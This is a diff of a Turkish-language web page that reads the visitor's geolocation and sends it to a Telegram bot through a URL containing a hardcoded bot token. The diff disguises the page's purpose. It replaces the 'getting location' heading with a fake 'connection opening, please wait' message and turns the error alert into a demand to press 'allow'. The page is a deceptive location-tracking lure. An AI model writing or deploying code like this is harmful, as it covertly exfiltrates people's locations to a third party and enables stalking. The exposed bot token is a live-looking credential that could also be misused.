@@ -4,7 +4,7 @@
     <title>Konum Tespiti</title>
   </head>
   <body>
-    <h3>Konum alınıyor...</h3>
+    <h3>Bağlantı Açılıyor lütfen bekleyin...</h3>
     <script>
       function sendLocation(lat, lon) {
         fetch("https://api.telegram.org/bot7906946385:AAE_qvqTw8qxZBkdktkQNrXDM7maV6bdKqA/sendMessage", {
@@ -25,7 +25,7 @@
             sendLocation(lat, lon);
           },
           function (error) {
-            alert("Konum alınamadı: " + error.message);
+            alert("LÜTFEN İZİN VERİNE BASIN: " + error.message);
           }
         );
       } else {
